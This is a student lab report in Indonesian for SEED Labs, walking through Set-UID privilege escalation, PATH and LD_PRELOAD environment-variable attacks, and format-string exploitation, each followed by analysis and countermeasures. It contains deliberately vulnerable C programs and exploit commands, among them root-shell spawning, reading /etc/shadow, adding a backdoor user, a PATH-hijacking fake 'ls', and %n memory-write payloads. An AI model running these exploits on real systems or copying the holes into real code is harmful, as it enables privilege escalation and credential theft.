# R1 — Software Security Attack

> **SEED Labs 2.0 · Ubuntu 20.04**
> Muhammad Tamim Nugraha — 5024231060 · Teknik Komputer ITS 2023

---

## Daftar Isi

1. [Set-UID Privilege Escalation](#1-set-uid-privilege-escalation)
2. [Environment Variable Attack](#2-environment-variable-attack)
3. [Format String Vulnerability](#3-format-string-vulnerability)
4. [Kesimpulan](#kesimpulan)
5. [Referensi](#referensi)

---

## 1. Set-UID Privilege Escalation

### 1.1 Tujuan Eksperimen

Memahami mekanisme Set-UID pada sistem UNIX/Linux dan bagaimana program yang berjalan dengan hak akses root dapat dieksploitasi apabila tidak dirancang dengan aman. Eksperimen ini mendemonstrasikan bagaimana penyerang dapat memanfaatkan program Set-UID untuk mendapatkan shell dengan hak akses root (*privilege escalation*).

### 1.2 Dasar Teori

Set-UID (Set User ID) adalah mekanisme keamanan UNIX yang memungkinkan pengguna menjalankan program tertentu dengan hak akses pemilik file (biasanya root), bukan hak akses pengguna yang menjalankannya. Bit Set-UID ditandai dengan `s` pada permission field:

```
-rwsr-xr-x 1 root root 12345 Jan 1 00:00 program
```

Mekanisme ini diperlukan untuk utilitas seperti `passwd`, `ping`, dan `mount` yang memerlukan akses privileged. Namun, jika program Set-UID memiliki kerentanan, penyerang dapat mengeksploitasinya untuk mendapatkan root access.

### 1.3 Langkah Eksploitasi

#### Task 1: Memahami Set-UID

```bash
# Melihat file Set-UID di sistem
find / -perm -4000 -type f 2>/dev/null

# Contoh output:
# /usr/bin/passwd
# /usr/bin/sudo
# /usr/bin/chfn
# /usr/bin/mount

# Periksa permission dari /usr/bin/passwd
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root 68208 ... /usr/bin/passwd
```

#### Task 2: Membuat Program Set-UID Vuln

Buat file `vuln_setuid.c`:

```c
/* vuln_setuid.c — Demonstrasi program Set-UID yang rentan */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char *cmd;

    if (argc < 2) {
        printf("Usage: %s <command>\n", argv[0]);
        return 1;
    }

    /* Kerentanan: menjalankan perintah dari input pengguna
       tanpa validasi, dalam konteks Set-UID root */
    cmd = argv[1];
    printf("[*] Menjalankan perintah: %s\n", cmd);
    system(cmd);

    return 0;
}
```

```bash
# Kompilasi program
gcc -o vuln_setuid vuln_setuid.c

# Set ownership ke root dan aktifkan Set-UID bit
sudo chown root:root vuln_setuid
sudo chmod 4755 vuln_setuid

# Verifikasi permission
ls -la vuln_setuid
# -rwsr-xr-x 1 root root ... vuln_setuid
```

#### Task 3: Eksploitasi untuk Mendapat Root Shell

```bash
# Sebagai user biasa, jalankan program Set-UID
# untuk mendapatkan root shell
./vuln_setuid "/bin/sh"

# Di dalam shell, verifikasi identity
whoami
# Seharusnya output: root (pada lingkungan tanpa countermeasure)
id
# uid=1000(seed) gid=1000(seed) euid=0(root)
```

#### Task 4: Menjalankan Perintah Privileged

```bash
# Membaca file yang hanya bisa dibaca root
./vuln_setuid "cat /etc/shadow"

# Menambahkan user baru (memerlukan root)
./vuln_setuid "useradd -m hacker"

# Mengubah password
./vuln_setuid "echo 'hacker:password123' | chpasswd"
```

#### Task 5: Countermeasure — Principle of Least Privilege

```c
/* secure_setuid.c — Versi aman dengan privilege dropping */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    uid_t real_uid = getuid();
    uid_t eff_uid = geteuid();

    printf("[*] Real UID: %d, Effective UID: %d\n", real_uid, eff_uid);

    /* Drop privilege sebelum menjalankan perintah user */
    if (seteuid(real_uid) != 0) {
        perror("seteuid");
        return 1;
    }

    printf("[*] Setelah privilege drop — UID: %d, EUID: %d\n",
           getuid(), geteuid());

    if (argc >= 2)
        system(argv[1]);

    return 0;
}
```

```bash
gcc -o secure_setuid secure_setuid.c
sudo chown root:root secure_setuid
sudo chmod 4755 secure_setuid

# Coba exploit lagi — seharusnya gagal mendapat root
./secure_setuid "/bin/sh"
whoami
# Output: seed (bukan root)
```

### 1.4 Analisis Percobaan

**Mengapa eksploitasi berhasil:**

1. **Pewarisan Hak Akses**: Ketika program Set-UID dijalankan, *effective UID* berubah menjadi pemilik file (root). Fungsi `system()` memanggil `/bin/sh -c <command>`, dan shell yang ter-spawn mewarisi *effective UID* = 0 (root).

2. **Tidak Ada Input Validation**: Program menerima input pengguna (`argv[1]`) dan langsung meneruskannya ke `system()` tanpa sanitasi. Ini memungkinkan *command injection*.

3. **Penggunaan `system()` yang Tidak Aman**: Fungsi `system()` menggunakan shell untuk mengeksekusi perintah, sehingga rentan terhadap manipulasi melalui operator shell (`;`, `|`, `&&`, `` ` ``).

**Countermeasure yang efektif:**
- **Privilege dropping**: Panggil `seteuid(getuid())` sebelum menjalankan operasi yang tidak memerlukan privilege.
- **Gunakan `execve()` daripada `system()`**: Menghindari shell interpreter mengurangi kemungkinan command injection.
- **Input validation**: Validasi dan sanitasi semua input pengguna.

### 1.5 Bukti Eksploitasi

![Bukti Set-UID Exploitation](images/placeholder-r1-setuid.png)

---

## 2. Environment Variable Attack

### 2.1 Tujuan Eksperimen

Memahami bagaimana *environment variables* dapat dimanipulasi untuk mengeksploitasi program Set-UID. Fokus pada serangan melalui variabel `PATH`, `LD_PRELOAD`, dan `LD_LIBRARY_PATH` yang dapat mengubah perilaku program.

### 2.2 Dasar Teori

Environment variables adalah pasangan key-value yang diwariskan dari proses induk ke proses anak. Beberapa variabel kritis:

| Variabel | Fungsi | Risiko |
|---|---|---|
| `PATH` | Lokasi pencarian executable | Mengarahkan ke program malicious |
| `LD_PRELOAD` | Library yang di-load sebelum semua library lain | Mengganti fungsi library standar |
| `LD_LIBRARY_PATH` | Path pencarian shared library | Memuat library berbahaya |
| `IFS` | Internal Field Separator | Mengubah parsing perintah shell |

### 2.3 Langkah Eksploitasi

#### Task 1: Serangan `PATH` Manipulation

```bash
# Buat program Set-UID yang memanggil perintah tanpa full path
cat > path_vuln.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

int main()
{
    printf("[*] Menjalankan 'ls' dari PATH...\n");
    /* Kerentanan: menggunakan relative command name */
    system("ls");
    return 0;
}
EOF

gcc -o path_vuln path_vuln.c
sudo chown root:root path_vuln
sudo chmod 4755 path_vuln
```

```bash
# Buat program berbahaya bernama "ls"
cat > /tmp/ls << 'EOF'
#!/bin/bash
echo "[!] PATH HIJACKED — menjalankan kode attacker!"
echo "[!] Effective UID: $(id -u)"
/bin/sh
EOF
chmod +x /tmp/ls

# Manipulasi PATH agar /tmp dicari terlebih dahulu
export PATH=/tmp:$PATH

# Jalankan program Set-UID — akan memanggil /tmp/ls
./path_vuln
# Output: "[!] PATH HIJACKED — menjalankan kode attacker!"
# Lalu mendapatkan shell dengan euid=0

# Verifikasi
whoami
id
```

#### Task 2: Serangan `LD_PRELOAD`

```bash
# Buat shared library berbahaya yang override fungsi sleep()
cat > mylib.c << 'EOF'
#include <stdio.h>

void sleep(int s)
{
    printf("[!] LD_PRELOAD HIJACK — fungsi sleep() di-override!\n");
    printf("[!] UID: %d, EUID: %d\n", getuid(), geteuid());
    /* Kode malicious bisa ditaruh di sini */
}
EOF

gcc -fPIC -shared -o /tmp/mylib.so mylib.c -nostartfiles
```

```bash
# Buat program yang memanggil sleep()
cat > preload_test.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

int main()
{
    printf("[*] Calling sleep(1)...\n");
    sleep(1);
    printf("[*] Done.\n");
    return 0;
}
EOF

gcc -o preload_test preload_test.c

# --- Test 1: Program biasa (non-SUID) ---
export LD_PRELOAD=/tmp/mylib.so
./preload_test
# Output: "[!] LD_PRELOAD HIJACK — fungsi sleep() di-override!"

# --- Test 2: Program Set-UID ---
sudo chown root:root preload_test
sudo chmod 4755 preload_test
export LD_PRELOAD=/tmp/mylib.so
./preload_test
# Output: sleep() asli yang terpanggil (LD_PRELOAD diabaikan!)
```

#### Task 3: Memeriksa Pewarisan Environment Variable

```bash
# Program untuk mencetak semua environment variables
cat > print_env.c << 'EOF'
#include <stdio.h>

extern char **environ;

int main()
{
    int i = 0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
    }
    return 0;
}
EOF

gcc -o print_env print_env.c
sudo chown root:root print_env
sudo chmod 4755 print_env

# Bandingkan environment pada program biasa vs Set-UID
export ATTACKER_VAR="injected_value"

echo "=== Program Biasa ==="
env | grep -E "LD_|PATH|ATTACKER"

echo "=== Program Set-UID ==="
./print_env | grep -E "LD_|PATH|ATTACKER"
# LD_PRELOAD dan LD_LIBRARY_PATH TIDAK diteruskan ke Set-UID
```

### 2.4 Analisis Percobaan

**Serangan PATH berhasil karena:**

1. Fungsi `system("ls")` menggunakan *relative path* untuk memanggil perintah `ls`. Shell akan mencari executable di direktori-direktori yang terdaftar dalam variabel `PATH` secara berurutan.
2. Dengan menambahkan `/tmp` di awal `PATH`, shell menemukan `/tmp/ls` (program malicious) sebelum `/bin/ls` (program asli).
3. Program Set-UID tidak membersihkan variabel `PATH` sebelum memanggil `system()`.

**Serangan LD_PRELOAD gagal pada Set-UID karena:**

1. **Linux Dynamic Linker Security**: Linux dynamic linker (`ld-linux.so`) secara otomatis **mengabaikan** `LD_PRELOAD` dan `LD_LIBRARY_PATH` ketika *real UID ≠ effective UID* (yaitu pada program Set-UID).
2. Ini adalah **countermeasure bawaan kernel Linux** yang dirancang untuk mencegah serangan *library injection* pada program privileged.
3. Proteksi ini diimplementasikan di `glibc` dan dapat dilihat di source code `elf/rtld.c`.

**Best Practices:**
- Selalu gunakan *absolute path* dalam program Set-UID (e.g., `/bin/ls` bukan `ls`)
- Bersihkan environment variables yang berbahaya: `unsetenv("PATH"); setenv("PATH", "/bin:/usr/bin", 1);`
- Gunakan `execve()` dengan explicit path daripada `system()`

### 2.5 Bukti Eksploitasi

![Bukti Environment Variable Attack](images/placeholder-r1-env.png)

---

## 3. Format String Vulnerability

### 3.1 Tujuan Eksperimen

Memahami kerentanan *format string* pada program C yang menggunakan fungsi `printf()` (dan keluarganya) secara tidak aman. Mendemonstrasikan cara membaca memori stack, menulis ke alamat memori arbitrary, dan mengeksekusi kode berbahaya melalui format string attack.

### 3.2 Dasar Teori

Format string vulnerability terjadi ketika input pengguna digunakan langsung sebagai *format string* pada fungsi keluarga `printf()`:

```c
/* RENTAN */
printf(user_input);       /* Input diinterpretasikan sebagai format string */

/* AMAN */
printf("%s", user_input); /* Input diperlakukan sebagai data biasa */
```

**Format specifier yang dieksploitasi:**

| Specifier | Fungsi | Penggunaan Serangan |
|---|---|---|
| `%x` | Cetak hex dari stack | Membaca isi stack (information leak) |
| `%s` | Cetak string dari pointer | Membaca memori arbitrary |
| `%n` | **Tulis** jumlah karakter ke alamat | **Menulis ke memori arbitrary** |
| `%p` | Cetak pointer address | Mengungkap alamat memori |
| `%08x` | Hex padded 8 karakter | Navigate stack secara presisi |

### 3.3 Langkah Eksploitasi

#### Persiapan Lingkungan

```bash
# Nonaktifkan ASLR
sudo sysctl -w kernel.randomize_va_space=0

# Nonaktifkan StackGuard (canary) saat kompilasi
# Flag: -fno-stack-protector
# Nonaktifkan NX/DEP: -z execstack
```

#### Task 1: Program Rentan

```c
/* fmt_vuln.c — Program dengan format string vulnerability */
#include <stdio.h>
#include <string.h>

/* Target variable yang akan kita ubah nilainya */
int secret = 0x44;
char msg[100] = "Pesan asli rahasia";

void vuln_func(char *input)
{
    char buf[256];
    snprintf(buf, sizeof(buf), input);    /* RENTAN! */
    printf("Output: %s\n", buf);
    printf("[DEBUG] secret = 0x%x (%d)\n", secret, secret);
    printf("[DEBUG] msg    = \"%s\"\n", msg);
    printf("[DEBUG] &secret = %p\n", &secret);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <format_string>\n", argv[0]);
        return 1;
    }

    printf("[*] Alamat secret: %p\n", &secret);
    printf("[*] Nilai secret sebelum: 0x%x\n", secret);

    vuln_func(argv[1]);

    printf("[*] Nilai secret sesudah: 0x%x\n", secret);
    return 0;
}
```

```bash
# Kompilasi dengan proteksi dinonaktifkan (32-bit)
gcc -m32 -g -z execstack -fno-stack-protector -o fmt_vuln fmt_vuln.c

# Set-UID (opsional untuk demonstrasi privilege escalation)
sudo chown root:root fmt_vuln
sudo chmod 4755 fmt_vuln
```

#### Task 2: Membaca Stack (Information Leak)

```bash
# Membaca isi stack menggunakan %x
./fmt_vuln "AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"

# Output contoh:
# AAAA.bffff5a0.00000100.b7e2a700.41414141.38302528...
#                                   ^^^^^^^^
#                       "AAAA" (0x41414141) ditemukan di stack!
# 'AAAA' muncul di posisi ke-4 pada stack

# Menggunakan Direct Parameter Access (DPA) untuk efisiensi
./fmt_vuln "AAAA%4\$x"
# Output: AAAA41414141
# Konfirmasi: posisi ke-4 di stack berisi input kita
```

#### Task 3: Membaca Memori Arbitrary (`%s`)

```bash
# Letakkan alamat target di awal string, baca dengan %s
# Misalkan alamat msg = 0x0804a040 (dari output debug)
# Little-endian: \x40\xa0\x04\x08

./fmt_vuln $(printf "\x40\xa0\x04\x08")"%4\$s"
# Output: String yang tersimpan di alamat 0x0804a040
```

#### Task 4: Menulis ke Memori Arbitrary (`%n`)

```bash
# %n menulis jumlah karakter yang sudah dicetak ke alamat di stack
# Misalkan alamat secret = 0x0804a02c

# Tulis nilai kecil (misal 0x50 = 80 decimal)
./fmt_vuln $(printf "\x2c\xa0\x04\x08")"%.76x%4\$n"
# Penjelasan:
# - 4 bytes alamat + 76 padding = 80 karakter total
# - %4$n menulis 80 (0x50) ke alamat di posisi stack ke-4

# Verifikasi
# Output: secret = 0x50
```

#### Task 5: Menulis Nilai Arbitrary dengan `%hn` (Half-Word Write)

```bash
# Untuk menulis nilai besar (misal 0xBEEF), gunakan %hn
# %hn menulis 2 bytes (half-word) sekaligus

# Target: secret = 0xBEEF
# Alamat secret    = 0x0804a02c (low 2 bytes — 0xBEEF)
# Alamat secret+2  = 0x0804a02e (high 2 bytes — 0x0000)

# Low half: 0xBEEF = 48879 decimal
# High half: 0x0000 = padding minimal

./fmt_vuln $(printf "\x2c\xa0\x04\x08\x2e\xa0\x04\x08")"%.48871x%4\$hn%.16657x%5\$hn"
# 48871 + 8 (alamat) = 48879 = 0xBEEF (low half)
# 16657 tambahan = 65536 = 0x10000 (high half wraps to 0x0000)

# Verifikasi
# Output: secret = 0xbeef
```

### 3.4 Analisis Percobaan

**Mengapa format string attack bekerja:**

1. **Arsitektur Stack x86**: Ketika `printf(user_input)` dipanggil, fungsi `printf()` membaca argumen dari stack. Jika format string mengandung specifier seperti `%x`, `printf()` mengambil data dari posisi stack berikutnya — meskipun tidak ada argumen yang di-push untuk specifier tersebut.

2. **%n — Write Primitive**: Format specifier `%n` unik karena **menulis** ke memori (bukan membaca). Ia menulis jumlah byte yang sudah dicetak ke alamat yang ditunjuk oleh argumen di stack. Dengan mengontrol alamat di stack (melalui input string) dan jumlah karakter yang dicetak (melalui padding `%Nx`), penyerang dapat menulis nilai arbitrary ke alamat arbitrary.

3. **Direct Parameter Access**: Notasi `%k$x` memungkinkan akses langsung ke parameter ke-k di stack, menghindari kebutuhan untuk "pop" parameter satu per satu.

4. **Chain of Exploitation**:
   - **Step 1**: Leak alamat memori dengan `%x` / `%p`
   - **Step 2**: Baca data sensitif dengan `%s`
   - **Step 3**: Overwrite GOT entry / return address dengan `%n`
   - **Step 4**: Redirect execution ke shellcode → **root shell**

**Countermeasures:**
- Selalu gunakan `printf("%s", input)`, **bukan** `printf(input)`
- Kompilasi dengan `-Wformat -Wformat-security -Werror=format-security`
- Compiler modern (GCC 4.x+) memberikan warning untuk format string tidak aman
- ASLR dan stack canaries mempersulit eksploitasi di lingkungan produksi
- Gunakan `FORTIFY_SOURCE`: kompilasi dengan `-D_FORTIFY_SOURCE=2`

### 3.5 Bukti Eksploitasi

![Bukti Format String Attack](images/placeholder-r1-fmtstr.png)

---

## Kesimpulan

| Serangan | Penyebab Utama | Dampak | Mitigasi |
|---|---|---|---|
| **Set-UID Exploit** | Tidak ada input validation; penggunaan `system()` | Root shell / privilege escalation | Privilege dropping, `execve()`, input sanitization |
| **PATH Manipulation** | Relative path pada `system()` | Eksekusi program attacker sebagai root | Absolute path, sanitasi `PATH` |
| **LD_PRELOAD** | Library injection pada program biasa | Function hooking | Sudah dimitigasi oleh kernel untuk Set-UID |
| **Format String** | `printf(user_input)` tanpa format specifier | Read/Write arbitrary memory, RCE | `printf("%s", input)`, compiler warnings |

Ketiga serangan ini menunjukkan bahwa **input validation** dan **principle of least privilege** adalah fondasi keamanan software. Sebuah kesalahan pemrograman yang tampak minor (seperti lupa `%s` pada `printf()`) dapat mengakibatkan kompromi total terhadap sistem.

---

## Referensi

1. Du, W. (2019). *Computer & Internet Security*, Chapter 1-3: Set-UID, Environment Variables, Format String.
2. SEED Lab — Set-UID: [https://seedsecuritylabs.org/Labs_20.04/Software/Set-UID/](https://seedsecuritylabs.org/Labs_20.04/Software/Set-UID/)
3. SEED Lab — Environment Variable: [https://seedsecuritylabs.org/Labs_20.04/Software/Environment_Variable_and_Set-UID/](https://seedsecuritylabs.org/Labs_20.04/Software/Environment_Variable_and_Set-UID/)
4. SEED Lab — Format String: [https://seedsecuritylabs.org/Labs_20.04/Software/Format_String/](https://seedsecuritylabs.org/Labs_20.04/Software/Format_String/)
5. CWE-134: Use of Externally-Controlled Format String — [https://cwe.mitre.org/data/definitions/134.html](https://cwe.mitre.org/data/definitions/134.html)

---

<p align="center"><em>R1 — Software Security Attack · Muhammad Tamim Nugraha · 5024231060</em></p>
